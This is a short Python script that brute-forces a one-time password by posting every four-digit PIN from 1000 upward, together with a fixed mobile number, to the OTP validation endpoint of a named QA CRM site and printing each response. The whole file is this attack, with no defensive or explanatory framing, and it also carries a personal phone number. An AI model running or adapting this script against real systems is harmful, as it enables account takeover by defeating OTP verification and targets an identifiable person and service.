import requests
import asyncio
from aiohttp import ClientSession


def OTP():
    #return requests.get("http://httpbin.org/get")
    for i in range(1000,9999):
        data={'pin':None,'mob_no':8110093393}
        data['pin']=i
        print(data)
        r=requests.post("https://qacfrcrm.tafe.com/index.php?entryPoint=validateOTP",data=data)
        print(r.text)

OTP()
